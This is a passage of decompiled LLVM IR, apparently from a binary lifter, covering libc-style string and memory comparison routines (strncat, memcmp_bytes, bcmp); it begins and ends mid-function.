  %v6_8058aea = or i32 %v3_8058aea, %v5_8058aea
  %v23_8058aeb = add i32 %v20_8058aeb, %v9_8058aea
  %v10_8058aea = add i32 %v7_8058aea, %v9_8058aea
  %v4_8058aee = icmp eq i8 %v2_8058aea, 0
  %v1_8058af0 = icmp eq i1 %v4_8058aee, false
  br i1 %v1_8058af0, label %dec_label_pc_8058aea, label %dec_label_pc_8058afa

dec_label_pc_8058af6:                             ; preds = %dec_label_pc_8058aea
  br label %dec_label_pc_8058afa

dec_label_pc_8058afa:                             ; preds = %dec_label_pc_8058aee, %dec_label_pc_8058af6
  %storemerge = phi i32 [ 1, %dec_label_pc_8058af6 ], [ 0, %dec_label_pc_8058aee ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8058aea, { 1, 2, 0 }
  uselistorder i32 %v9_8058aea, { 1, 0 }
  uselistorder label %dec_label_pc_8058afa, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8058b03 = load i32, i32* @esi, align 4
  store i32 %v0_8058b03, i32* %stack_var_-8, align 4
  %v4_8058b07 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8058b07, i32* %esi.global-to-local, align 4
  %v4_8058b0f = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8058b13 = call i32 @_strlen(i8* %v4_8058b0f)
  %v2_8058b15 = add i32 %tmp, -1
  store i32 %v2_8058b15, i32* %edi.global-to-local, align 4
  %v8_8058b1913 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* @ecx, align 4
  br i1 %v8_8058b1913, label %dec_label_pc_8058b24, label %dec_label_pc_8058b1c.lr.ph

dec_label_pc_8058b1c.lr.ph:                       ; preds = %entry
  %v4_8058b1c.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8058b1c.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8058b1c

dec_label_pc_8058b1c:                             ; preds = %dec_label_pc_8058b1c.lr.ph, %dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge
  %v8_8058b1c = phi i1 [ %v8_8058b1c.pre, %dec_label_pc_8058b1c.lr.ph ], [ %v5_8058b1d, %dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge ]
  %v4_8058b1c = phi i32 [ %v4_8058b1c.pre, %dec_label_pc_8058b1c.lr.ph ], [ %v0_8058b1e, %dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge ]
  %v2_8058b2615 = phi i32 [ %v2_8058b15, %dec_label_pc_8058b1c.lr.ph ], [ %v7_8058b1d, %dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge ]
  %v0_8058b1c = load i32, i32* %esi.global-to-local, align 4
  %v1_8058b1c = inttoptr i32 %v0_8058b1c to i8*
  %v2_8058b1c = load i8, i8* %v1_8058b1c, align 1
  %v3_8058b1c = zext i8 %v2_8058b1c to i32
  %v5_8058b1c = and i32 %v4_8058b1c, -256
  %v6_8058b1c = or i32 %v5_8058b1c, %v3_8058b1c
  store i32 %v6_8058b1c, i32* %eax.global-to-local, align 4
  %v9_8058b1c = select i1 %v8_8058b1c, i32 -1, i32 1
  %v10_8058b1c = add i32 %v9_8058b1c, %v0_8058b1c
  store i32 %v10_8058b1c, i32* %esi.global-to-local, align 4
  %v3_8058b1d = inttoptr i32 %v2_8058b2615 to i8*
  store i8 %v2_8058b1c, i8* %v3_8058b1d, align 1
  %v4_8058b1d = load i32, i32* %edi.global-to-local, align 4
  %v5_8058b1d = load i1, i1* @df, align 1
  %v6_8058b1d = select i1 %v5_8058b1d, i32 -1, i32 1
  %v7_8058b1d = add i32 %v6_8058b1d, %v4_8058b1d
  store i32 %v7_8058b1d, i32* %edi.global-to-local, align 4
  %v0_8058b1e = load i32, i32* %eax.global-to-local, align 4
  %v3_8058b1e = trunc i32 %v0_8058b1e to i8
  %v4_8058b1e = icmp eq i8 %v3_8058b1e, 0
  %v1_8058b20 = icmp eq i1 %v4_8058b1e, false
  br i1 %v1_8058b20, label %dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge, label %dec_label_pc_8058b27

dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge: ; preds = %dec_label_pc_8058b1c
  %v0_8058b19.pre = load i32, i32* @ecx, align 4
  %v1_8058b19 = add i32 %v0_8058b19.pre, -1
  %v8_8058b19 = icmp eq i32 %v1_8058b19, 0
  store i32 %v1_8058b19, i32* @ecx, align 4
  br i1 %v8_8058b19, label %dec_label_pc_8058b24, label %dec_label_pc_8058b1c

dec_label_pc_8058b24:                             ; preds = %dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge, %entry
  %v2_8058b26.lcssa = phi i32 [ %v2_8058b15, %entry ], [ %v7_8058b1d, %dec_label_pc_8058b1c.dec_label_pc_8058b19_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8058b26 = inttoptr i32 %v2_8058b26.lcssa to i8*
  store i8 0, i8* %v3_8058b26, align 1
  %v4_8058b26 = load i32, i32* %edi.global-to-local, align 4
  %v5_8058b26 = load i1, i1* @df, align 1
  %v6_8058b26 = select i1 %v5_8058b26, i32 -1, i32 1
  %v7_8058b26 = add i32 %v6_8058b26, %v4_8058b26
  store i32 %v7_8058b26, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8058b27

dec_label_pc_8058b27:                             ; preds = %dec_label_pc_8058b1c, %dec_label_pc_8058b24
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8058b2b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8058b2b, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8058b19, { 1, 0 }
  uselistorder i32 %v0_8058b1e, { 1, 0 }
  uselistorder i32 %v7_8058b1d, { 0, 2, 1 }
  uselistorder i1 %v5_8058b1d, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8058b27, { 1, 0 }
  uselistorder label %dec_label_pc_8058b1c, { 1, 0 }
}

define i32 @memcmp_bytes() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v15_8058b31 = ptrtoint i32* %stack_var_-12 to i32
  %v0_8058b34 = load i32, i32* @eax, align 4
  store i32 %v0_8058b34, i32* %stack_var_-8, align 4
  %v2_8058b38 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8058b3e = load i32, i32* @edx, align 4
  store i32 %v0_8058b3e, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8058b41

dec_label_pc_8058b41:                             ; preds = %dec_label_pc_8058b41, %entry
  %v0_8058b45 = phi i32 [ %v1_8058b48, %dec_label_pc_8058b41 ], [ %v15_8058b31, %entry ]
  %v0_8058b41 = phi i32 [ %v1_8058b44, %dec_label_pc_8058b41 ], [ %v2_8058b38, %entry ]
  %v1_8058b41 = inttoptr i32 %v0_8058b41 to i8*
  %v2_8058b41 = load i8, i8* %v1_8058b41, align 1
  %v3_8058b41 = zext i8 %v2_8058b41 to i32
  %v1_8058b44 = add i32 %v0_8058b41, 1
  %v1_8058b45 = inttoptr i32 %v0_8058b45 to i8*
  %v2_8058b45 = load i8, i8* %v1_8058b45, align 1
  %v3_8058b45 = zext i8 %v2_8058b45 to i32
  %v1_8058b48 = add i32 %v0_8058b45, 1
  %v2_8058b49 = sub nsw i32 %v3_8058b41, %v3_8058b45
  %v12_8058b49 = icmp eq i32 %v2_8058b49, 0
  br i1 %v12_8058b49, label %dec_label_pc_8058b41, label %dec_label_pc_8058b4d

dec_label_pc_8058b4d:                             ; preds = %dec_label_pc_8058b41
  store i32 %v0_8058b3e, i32* @edx, align 4
  store i32 %v0_8058b34, i32* @ecx, align 4
  ret i32 %v2_8058b49

; uselistorder directives
  uselistorder i32 %v0_8058b41, { 1, 0 }
  uselistorder i32 %v0_8058b45, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @bcmp() local_unnamed_addr {
entry:
  %tmp146 = call i8* @__decompiler_undefined_function_1()
  %tmp147 = call i8* @__decompiler_undefined_function_1()
  %tmp148 = call i32 @__decompiler_undefined_function_0()
  %v0_8058b56 = load i32, i32* @ebx, align 4
  %v4_8058b5f = ptrtoint i8* %tmp147 to i32
  store i32 %v4_8058b5f, i32* @ecx, align 4
  %v4_8058b63 = ptrtoint i8* %tmp146 to i32
  store i32 %v4_8058b63, i32* @ebx, align 4
  %v6_8058b67 = icmp ugt i32 %tmp148, 15
  br i1 %v6_8058b67, label %dec_label_pc_8058b84.preheader, label %dec_label_pc_8058de7.preheader

dec_label_pc_8058b84.preheader:                   ; preds = %entry
  %v2_8058b8445 = urem i32 %v4_8058b63, 4
  %v3_8058b8446 = icmp eq i32 %v2_8058b8445, 0
  %v1_8058b8b52 = icmp eq i1 %v3_8058b8446, false
  br i1 %v1_8058b8b52, label %dec_label_pc_8058b6e, label %dec_label_pc_8058b8d

dec_label_pc_8058b6e:                             ; preds = %dec_label_pc_8058b84.preheader, %dec_label_pc_8058b7e
  %v0_8058b82 = phi i32 [ %v1_8058b82, %dec_label_pc_8058b7e ], [ %v4_8058b5f, %dec_label_pc_8058b84.preheader ]
  %v0_8058b83 = phi i32 [ %v1_8058b83, %dec_label_pc_8058b7e ], [ %v4_8058b63, %dec_label_pc_8058b84.preheader ]
  %stack_var_12.053 = phi i32 [ %v4_8058b7e, %dec_label_pc_8058b7e ], [ %tmp148, %dec_label_pc_8058b84.preheader ]
  %v1_8058b6e = inttoptr i32 %v0_8058b83 to i8*
  %v2_8058b6e = load i8, i8* %v1_8058b6e, align 1
  %v3_8058b6e = zext i8 %v2_8058b6e to i32
  %v1_8058b71 = inttoptr i32 %v0_8058b82 to i8*
  %v2_8058b71 = load i8, i8* %v1_8058b71, align 1
  %v3_8058b71 = zext i8 %v2_8058b71 to i32
  %v2_8058b74 = sub nsw i32 %v3_8058b71, %v3_8058b6e
  %v12_8058b74 = icmp eq i32 %v2_8058b74, 0
  store i32 %v2_8058b74, i32* @edx, align 4
  %v1_8058b78 = icmp eq i1 %v12_8058b74, false
  br i1 %v1_8058b78, label %dec_label_pc_8058df0, label %dec_label_pc_8058b7e

dec_label_pc_8058b7e:                             ; preds = %dec_label_pc_8058b6e
  %v4_8058b7e = add i32 %stack_var_12.053, -1
  %v1_8058b82 = add i32 %v0_8058b82, 1
  store i32 %v1_8058b82, i32* @ecx, align 4
  %v1_8058b83 = add i32 %v0_8058b83, 1
  store i32 %v1_8058b83, i32* @ebx, align 4
  %v2_8058b84 = urem i32 %v1_8058b83, 4
  %v3_8058b84 = icmp eq i32 %v2_8058b84, 0
  %v1_8058b8b = icmp eq i1 %v3_8058b84, false
  br i1 %v1_8058b8b, label %dec_label_pc_8058b6e, label %dec_label_pc_8058b8d

dec_label_pc_8058b8d:                             ; preds = %dec_label_pc_8058b7e, %dec_label_pc_8058b84.preheader
  %v0_8058c6a = phi i32 [ %v4_8058b5f, %dec_label_pc_8058b84.preheader ], [ %v1_8058b82, %dec_label_pc_8058b7e ]
  %stack_var_12.0.lcssa = phi i32 [ %tmp148, %dec_label_pc_8058b84.preheader ], [ %v4_8058b7e, %dec_label_pc_8058b7e ]
  %v0_8058cd6 = phi i32 [ %v4_8058b63, %dec_label_pc_8058b84.preheader ], [ %v1_8058b83, %dec_label_pc_8058b7e ]
  %v1_8058b8f = urem i32 %v0_8058c6a, 4
  %v2_8058b8f = icmp eq i32 %v1_8058b8f, 0
  %v1_8058b96 = icmp eq i1 %v2_8058b8f, false
  br i1 %v1_8058b96, label %dec_label_pc_8058c50, label %dec_label_pc_8058b9c

dec_label_pc_8058b9c:                             ; preds = %dec_label_pc_8058b8d
  %v2_8058ba0 = udiv i32 %stack_var_12.0.lcssa, 4
  %v1_8058ba5 = urem i32 %v2_8058ba0, 4
  %v9_8058ba8 = icmp eq i32 %v1_8058ba5, 1
  br i1 %v9_8058ba8, label %dec_label_pc_8058bdc, label %dec_label_pc_8058bad

dec_label_pc_8058bad:                             ; preds = %dec_label_pc_8058b9c
  %v2_8058ba5 = icmp eq i32 %v1_8058ba5, 0
  br i1 %v2_8058ba5, label %dec_label_pc_8058bd6, label %dec_label_pc_8058baf

dec_label_pc_8058baf:                             ; preds = %dec_label_pc_8058bad
  %v9_8058baf = icmp eq i32 %v1_8058ba5, 3
  %v1_8058bb2 = inttoptr i32 %v0_8058c6a to i32*
  %v2_8058bb2 = load i32, i32* %v1_8058bb2, align 4
  %v1_8058bb4 = inttoptr i32 %v0_8058cd6 to i32*
  %v2_8058bb4 = load i32, i32* %v1_8058bb4, align 4
  br i1 %v9_8058baf, label %dec_label_pc_8058bc7, label %dec_label_pc_8058bb8

dec_label_pc_8058bb8:                             ; preds = %dec_label_pc_8058baf
  %v1_8058bba = add i32 %v0_8058c6a, -8
  store i32 %v1_8058bba, i32* @ecx, align 4
  store i32 %v2_8058bb4, i32* @edx, align 4
  %v1_8058bbf = add i32 %v0_8058cd6, -8
  store i32 %v1_8058bbf, i32* @ebx, align 4
  %v1_8058bc2 = add nuw nsw i32 %v2_8058ba0, 2
  br label %dec_label_pc_8058c17

dec_label_pc_8058bc7:                             ; preds = %dec_label_pc_8058baf
  %v1_8058bc9 = add i32 %v0_8058c6a, -4
  store i32 %v1_8058bc9, i32* @ecx, align 4
  %v1_8058bcc = add i32 %v0_8058cd6, -4
  store i32 %v1_8058bcc, i32* @ebx, align 4
  %v1_8058bcf = add nuw nsw i32 %v2_8058ba0, 1
  br label %dec_label_pc_8058c03

dec_label_pc_8058bd6:                             ; preds = %dec_label_pc_8058bad
  %v1_8058bd6 = inttoptr i32 %v0_8058c6a to i32*
  %v2_8058bd6 = load i32, i32* %v1_8058bd6, align 4
  store i32 %v2_8058bd6, i32* @eax, align 4
  %v1_8058bd8 = inttoptr i32 %v0_8058cd6 to i32*
  %v2_8058bd8 = load i32, i32* %v1_8058bd8, align 4
  store i32 %v2_8058bd8, i32* @edx, align 4
  br label %dec_label_pc_8058bf5

dec_label_pc_8058bdc:                             ; preds = %dec_label_pc_8058b9c
  %v1_8058bdc = inttoptr i32 %v0_8058c6a to i32*
  %v2_8058bdc = load i32, i32* %v1_8058bdc, align 4
  %v1_8058bde = add nsw i32 %v2_8058ba0, -1
  %v1_8058bdf = add i32 %v0_8058c6a, 4
  store i32 %v1_8058bdf, i32* @ecx, align 4
  %v1_8058be6 = inttoptr i32 %v0_8058cd6 to i32*
  %v2_8058be6 = load i32, i32* %v1_8058be6, align 4
  %v1_8058be8 = add i32 %v0_8058cd6, 4
  br label %dec_label_pc_8058beb

dec_label_pc_8058beb:                             ; preds = %dec_label_pc_8058c2c, %dec_label_pc_8058bdc
  %v0_8058c2775 = phi i32 [ %v1_8058bde, %dec_label_pc_8058bdc ], [ %v1_8058c27, %dec_label_pc_8058c2c ]
  %v0_8058bef = phi i32 [ %v1_8058bdf, %dec_label_pc_8058bdc ], [ %v1_8058c2c, %dec_label_pc_8058c2c ]
  %v4_8058beb = phi i32 [ %v2_8058be6, %dec_label_pc_8058bdc ], [ %v3_8058c22, %dec_label_pc_8058c2c ]
  %storemerge24.in = phi i32 [ %v1_8058be8, %dec_label_pc_8058bdc ], [ %v1_8058c2f, %dec_label_pc_8058c2c ]
  %stack_var_-48.0 = phi i32 [ %v2_8058bdc, %dec_label_pc_8058bdc ], [ %v3_8058c17, %dec_label_pc_8058c2c ]
  store i32 %storemerge24.in, i32* @ebx, align 4
  %v15_8058beb = icmp eq i32 %stack_var_-48.0, %v4_8058beb
  %v1_8058bef = inttoptr i32 %v0_8058bef to i32*
  %v2_8058bef = load i32, i32* %v1_8058bef, align 4
  store i32 %v2_8058bef, i32* @eax, align 4
  %v1_8058bf1 = inttoptr i32 %storemerge24.in to i32*
  %v2_8058bf1 = load i32, i32* %v1_8058bf1, align 4
  store i32 %v2_8058bf1, i32* @edx, align 4
  %v1_8058bf3 = icmp eq i1 %v15_8058beb, false
  br i1 %v1_8058bf3, label %dec_label_pc_8058c40, label %dec_label_pc_8058bf5

dec_label_pc_8058bf5:                             ; preds = %dec_label_pc_8058beb, %dec_label_pc_8058bd6
  %v0_8058c2774 = phi i32 [ %v0_8058c2775, %dec_label_pc_8058beb ], [ %v2_8058ba0, %dec_label_pc_8058bd6 ]
  %v0_8058bfe = phi i32 [ %storemerge24.in, %dec_label_pc_8058beb ], [ %v0_8058cd6, %dec_label_pc_8058bd6 ]
  %v1_8058bf8 = phi i32 [ %v2_8058bf1, %dec_label_pc_8058beb ], [ %v2_8058bd8, %dec_label_pc_8058bd6 ]
  %v0_8058bf8 = phi i32 [ %v2_8058bef, %dec_label_pc_8058beb ], [ %v2_8058bd6, %dec_label_pc_8058bd6 ]
  %v0_8058bf5 = phi i32 [ %v0_8058bef, %dec_label_pc_8058beb ], [ %v0_8058c6a, %dec_label_pc_8058bd6 ]
  %v1_8058bf5 = add i32 %v0_8058bf5, 4
  %v2_8058bf5 = inttoptr i32 %v1_8058bf5 to i32*
  %v3_8058bf5 = load i32, i32* %v2_8058bf5, align 4
  %v12_8058bf8 = icmp eq i32 %v0_8058bf8, %v1_8058bf8
  %v1_8058bfe = add i32 %v0_8058bfe, 4
  %v2_8058bfe = inttoptr i32 %v1_8058bfe to i32*
  %v3_8058bfe = load i32, i32* %v2_8058bfe, align 4
  %v1_8058c01 = icmp eq i1 %v12_8058bf8, false
  br i1 %v1_8058c01, label %dec_label_pc_8058c46, label %dec_label_pc_8058c03

dec_label_pc_8058c03:                             ; preds = %dec_label_pc_8058bf5, %dec_label_pc_8058bc7
  %v0_8058c2773 = phi i32 [ %v0_8058c2774, %dec_label_pc_8058bf5 ], [ %v1_8058bcf, %dec_label_pc_8058bc7 ]
  %v0_8058c0a = phi i32 [ %v0_8058bfe, %dec_label_pc_8058bf5 ], [ %v1_8058bcc, %dec_label_pc_8058bc7 ]
  %v0_8058c07 = phi i32 [ %v0_8058bf5, %dec_label_pc_8058bf5 ], [ %v1_8058bc9, %dec_label_pc_8058bc7 ]
  %v0_8058c13 = phi i32 [ %v3_8058bfe, %dec_label_pc_8058bf5 ], [ %v2_8058bb4, %dec_label_pc_8058bc7 ]
  %stack_var_-20.0 = phi i32 [ %v3_8058bf5, %dec_label_pc_8058bf5 ], [ %v2_8058bb2, %dec_label_pc_8058bc7 ]
  %v15_8058c03 = icmp eq i32 %stack_var_-20.0, %v0_8058c13
  %v1_8058c07 = add i32 %v0_8058c07, 8
  %v2_8058c07 = inttoptr i32 %v1_8058c07 to i32*
  %v3_8058c07 = load i32, i32* %v2_8058c07, align 4
  %v1_8058c0a = add i32 %v0_8058c0a, 8
  %v2_8058c0a = inttoptr i32 %v1_8058c0a to i32*
  %v3_8058c0a = load i32, i32* %v2_8058c0a, align 4
  store i32 %v3_8058c0a, i32* @edx, align 4
  br i1 %v15_8058c03, label %dec_label_pc_8058c17, label %dec_label_pc_8058c0f

dec_label_pc_8058c0f:                             ; preds = %dec_label_pc_8058c03
  store i32 %stack_var_-20.0, i32* @eax, align 4
  store i32 %v0_8058c13, i32* @edx, align 4
  br label %dec_label_pc_8058c46

dec_label_pc_8058c17:                             ; preds = %dec_label_pc_8058c03, %dec_label_pc_8058bb8
  %v0_8058c27 = phi i32 [ %v0_8058c2773, %dec_label_pc_8058c03 ], [ %v1_8058bc2, %dec_label_pc_8058bb8 ]
  %v0_8058c2f = phi i32 [ %v0_8058c0a, %dec_label_pc_8058c03 ], [ %v1_8058bbf, %dec_label_pc_8058bb8 ]
  %v1_8058c1a = phi i32 [ %v3_8058c0a, %dec_label_pc_8058c03 ], [ %v2_8058bb4, %dec_label_pc_8058bb8 ]
  %v0_8058c20 = phi i32 [ %v3_8058c07, %dec_label_pc_8058c03 ], [ %v2_8058bb2, %dec_label_pc_8058bb8 ]
  %v0_8058c2c = phi i32 [ %v0_8058c07, %dec_label_pc_8058c03 ], [ %v1_8058bba, %dec_label_pc_8058bb8 ]
  %v1_8058c17 = add i32 %v0_8058c2c, 12
  %v2_8058c17 = inttoptr i32 %v1_8058c17 to i32*
  %v3_8058c17 = load i32, i32* %v2_8058c17, align 4
  %v12_8058c1a = icmp eq i32 %v0_8058c20, %v1_8058c1a
  store i32 %v0_8058c20, i32* @eax, align 4
  %v1_8058c22 = add i32 %v0_8058c2f, 12
  %v2_8058c22 = inttoptr i32 %v1_8058c22 to i32*
  %v3_8058c22 = load i32, i32* %v2_8058c22, align 4
  %v1_8058c25 = icmp eq i1 %v12_8058c1a, false
  br i1 %v1_8058c25, label %dec_label_pc_8058c46, label %dec_label_pc_8058c27

dec_label_pc_8058c27:                             ; preds = %dec_label_pc_8058c17
  %v1_8058c27 = add i32 %v0_8058c27, -4
  %v9_8058c27 = icmp eq i32 %v1_8058c27, 0
  br i1 %v9_8058c27, label %dec_label_pc_8058c34, label %dec_label_pc_8058c2c

dec_label_pc_8058c2c:                             ; preds = %dec_label_pc_8058c27
  %v1_8058c2c = add i32 %v0_8058c2c, 16
  store i32 %v1_8058c2c, i32* @ecx, align 4
  %v1_8058c2f = add i32 %v0_8058c2f, 16
  br label %dec_label_pc_8058beb

dec_label_pc_8058c34:                             ; preds = %dec_label_pc_8058c27
  %v15_8058c36 = icmp eq i32 %v3_8058c17, %v3_8058c22
  br i1 %v15_8058c36, label %dec_label_pc_8058db7, label %dec_label_pc_8058c40

dec_label_pc_8058c40:                             ; preds = %dec_label_pc_8058c34, %dec_label_pc_8058beb
  %v0_8058c44 = phi i32 [ %v4_8058beb, %dec_label_pc_8058beb ], [ %v3_8058c22, %dec_label_pc_8058c34 ]
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_8058beb ], [ %v3_8058c17, %dec_label_pc_8058c34 ]
  store i32 %stack_var_-48.1, i32* @eax, align 4
  store i32 %v0_8058c44, i32* @edx, align 4
  br label %dec_label_pc_8058c46

dec_label_pc_8058c46:                             ; preds = %dec_label_pc_8058c17, %dec_label_pc_8058bf5, %dec_label_pc_8058c0f, %dec_label_pc_8058c40
  %v0_8058c46 = call i32 @memcmp_bytes()
  br label %dec_label_pc_8058db7

dec_label_pc_8058c50:                             ; preds = %dec_label_pc_8058b8d
  %v2_8058c54 = mul nuw nsw i32 %v1_8058b8f, 8
  %v6_8058c5f = sub nsw i32 32, %v2_8058c54
  %v2_8058c63 = udiv i32 %stack_var_12.0.lcssa, 4
  %v1_8058c74 = and i32 %v0_8058c6a, -4
  store i32 %v1_8058c74, i32* @edx, align 4
  %v1_8058c77 = urem i32 %v2_8058c63, 4
  %v9_8058c7a = icmp eq i32 %v1_8058c77, 1
  br i1 %v9_8058c7a, label %dec_label_pc_8058cca, label %dec_label_pc_8058c7f

dec_label_pc_8058c7f:                             ; preds = %dec_label_pc_8058c50
  %v2_8058c77 = icmp eq i32 %v1_8058c77, 0
  br i1 %v2_8058c77, label %dec_label_pc_8058cba, label %dec_label_pc_8058c81

dec_label_pc_8058c81:                             ; preds = %dec_label_pc_8058c7f
  %v9_8058c81 = icmp eq i32 %v1_8058c77, 3
  %v1_8058c84 = inttoptr i32 %v1_8058c74 to i32*
  %v2_8058c84 = load i32, i32* %v1_8058c84, align 4
  %v1_8058c86 = inttoptr i32 %v0_8058cd6 to i32*
  %v2_8058c86 = load i32, i32* %v1_8058c86, align 4
  %v1_8058c88 = add i32 %v1_8058c74, 4
  %v2_8058c88 = inttoptr i32 %v1_8058c88 to i32*
  %v3_8058c88 = load i32, i32* %v2_8058c88, align 4
  br i1 %v9_8058c81, label %dec_label_pc_8058ca7, label %dec_label_pc_8058c8d

dec_label_pc_8058c8d:                             ; preds = %dec_label_pc_8058c81
  %v4_8058c8d = add nuw nsw i32 %v2_8058c63, 2
  %v1_8058c94 = add i32 %v1_8058c74, -4
  store i32 %v1_8058c94, i32* @edx, align 4
  %v1_8058c97 = add i32 %v0_8058cd6, -8
  store i32 %v1_8058c97, i32* @ebx, align 4
  br label %bb170

dec_label_pc_8058ca7:                             ; preds = %dec_label_pc_8058c81
  %v4_8058ca7 = add nuw nsw i32 %v2_8058c63, 1
  %v1_8058cad = add i32 %v0_8058cd6, -4
  store i32 %v1_8058cad, i32* @ebx, align 4
  br label %bb165

dec_label_pc_8058cba:                             ; preds = %dec_label_pc_8058c7f
  %v1_8058cba = add i32 %v1_8058c74, 4
  %v2_8058cba = inttoptr i32 %v1_8058cba to i32*
  %v3_8058cba = load i32, i32* %v2_8058cba, align 4
  %v1_8058cbd = inttoptr i32 %v1_8058c74 to i32*
  %v2_8058cbd = load i32, i32* %v1_8058cbd, align 4
  store i32 %v1_8058cba, i32* @edx, align 4
  %v1_8058cc6 = inttoptr i32 %v0_8058cd6 to i32*
  %v2_8058cc6 = load i32, i32* %v1_8058cc6, align 4
  br label %bb160

dec_label_pc_8058cca:                             ; preds = %dec_label_pc_8058c50
  %v1_8058cca = inttoptr i32 %v1_8058c74 to i32*
  %v2_8058cca = load i32, i32* %v1_8058cca, align 4
  %v1_8058cd0 = add i32 %v1_8058c74, 4
  %v2_8058cd0 = inttoptr i32 %v1_8058cd0 to i32*
  %v3_8058cd0 = load i32, i32* %v2_8058cd0, align 4
  %v1_8058cd3 = add i32 %v1_8058c74, 8
  store i32 %v1_8058cd3, i32* @edx, align 4
  %v1_8058cd6 = inttoptr i32 %v0_8058cd6 to i32*
  %v2_8058cd6 = load i32, i32* %v1_8058cd6, align 4
  %v1_8058cd8 = add i32 %v0_8058cd6, 4
  store i32 %v1_8058cd8, i32* @ebx, align 4
  %v4_8058cdb = add nsw i32 %v2_8058c63, -1
  br label %bb155

bb155:                                            ; preds = %dec_label_pc_8058d89, %dec_label_pc_8058cca
  %storemerge9.pre = phi i32 [ %v3_8058d61, %dec_label_pc_8058d89 ], [ %v2_8058cd6, %dec_label_pc_8058cca ]
  %v0_8058cf8 = phi i32 [ %v3_8058d5e, %dec_label_pc_8058d89 ], [ %v3_8058cd0, %dec_label_pc_8058cca ]
  %v0_8058ced = phi i32 [ %v1_8058d8c, %dec_label_pc_8058d89 ], [ %v1_8058cd8, %dec_label_pc_8058cca ]
  %v6_8058ce1 = phi i32 [ %v8_8058d66, %dec_label_pc_8058d89 ], [ %v0_8058c6a, %dec_label_pc_8058cca ]
  %v0_8058cdf = phi i32 [ %v1_8058d89, %dec_label_pc_8058d89 ], [ %v1_8058cd3, %dec_label_pc_8058cca ]
  %stack_var_-24.0 = phi i32 [ %v4_8058d82, %dec_label_pc_8058d89 ], [ %v4_8058cdb, %dec_label_pc_8058cca ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.1, %dec_label_pc_8058d89 ], [ %v2_8058cca, %dec_label_pc_8058cca ]
  %v1_8058cdf = inttoptr i32 %v0_8058cdf to i32*
  %v2_8058cdf = load i32, i32* %v1_8058cdf, align 4
  %v7_8058ce1 = and i32 %v6_8058ce1, -256
  %v1_8058ced = inttoptr i32 %v0_8058ced to i32*
  %v2_8058ced = load i32, i32* %v1_8058ced, align 4
  %v5_8058cef = lshr i32 %stack_var_-36.0, %v2_8058c54
  %v8_8058cf1 = or i32 %v7_8058ce1, %v6_8058c5f
  %v2_8058cfa = and i32 %v6_8058c5f, 24
  %v4_8058cfa = icmp eq i32 %v2_8058cfa, 0
  br i1 %v4_8058cfa, label %bb158, label %bb156

bb156:                                            ; preds = %bb155
  %v5_8058cfa = shl i32 %v0_8058cf8, %v2_8058cfa
  br label %bb158

bb158:                                            ; preds = %bb155, %bb156
  %v3_8058cfc = phi i32 [ %v0_8058cf8, %bb155 ], [ %v5_8058cfa, %bb156 ]
  %v4_8058cfc = or i32 %v3_8058cfc, %v5_8058cef
  %v14_8058cff = icmp eq i32 %v4_8058cfc, %storemerge9.pre
  br i1 %v14_8058cff, label %bb160, label %dec_label_pc_8058d7d

bb160:                                            ; preds = %bb158, %dec_label_pc_8058cba
  %v1_8058d24 = phi i32 [ %v2_8058ced, %bb158 ], [ %v2_8058cc6, %dec_label_pc_8058cba ]
  %v0_8058d1d = phi i32 [ %v0_8058ced, %bb158 ], [ %v0_8058cd6, %dec_label_pc_8058cba ]
  %v0_8058d17 = phi i32 [ %v0_8058cf8, %bb158 ], [ %v2_8058cbd, %dec_label_pc_8058cba ]
  %v6_8058d0b = phi i32 [ %v8_8058cf1, %bb158 ], [ %v3_8058cba, %dec_label_pc_8058cba ]
  %v0_8058d20 = phi i32 [ %v2_8058cdf, %bb158 ], [ %v3_8058cba, %dec_label_pc_8058cba ]
  %v0_8058d08 = phi i32 [ %v0_8058cdf, %bb158 ], [ %v1_8058cba, %dec_label_pc_8058cba ]
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %bb158 ], [ %v2_8058c63, %dec_label_pc_8058cba ]
  %v1_8058d08 = add i32 %v0_8058d08, 4
  %v2_8058d08 = inttoptr i32 %v1_8058d08 to i32*
  %v3_8058d08 = load i32, i32* %v2_8058d08, align 4
  %v7_8058d0b = and i32 %v6_8058d0b, -256
  %v5_8058d17 = lshr i32 %v0_8058d17, %v2_8058c54
  %v8_8058d19 = or i32 %v7_8058d0b, %v6_8058c5f
  %v1_8058d1d = add i32 %v0_8058d1d, 4
  %v2_8058d1d = inttoptr i32 %v1_8058d1d to i32*
